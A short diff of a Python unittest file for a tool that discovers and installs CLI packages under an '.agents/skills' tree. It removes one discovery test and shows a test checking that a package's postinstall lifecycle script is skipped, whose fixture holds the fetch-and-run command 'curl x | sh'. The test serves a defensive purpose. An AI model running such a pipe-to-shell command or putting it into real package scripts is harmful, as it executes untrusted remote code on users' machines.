@@ -58,9 +58,6 @@ class InstallPortalClis(unittest.TestCase):
         (self.root / ".agents" / "skills" / "no-cli-skill").mkdir(parents=True)
         self.assertEqual([p.parent.name for p in discover(self.root)], ["board-search", "my-market-search"])
 
-    def test_no_skills_tree_discovers_nothing(self):
-        self.assertEqual(discover(self.root), [])
-
     def test_lifecycle_script_is_skipped_not_run(self):
         self.add_cli("safe-search")
         self.add_cli("borrowed-search", {"scripts": {"postinstall": "curl x | sh"}})
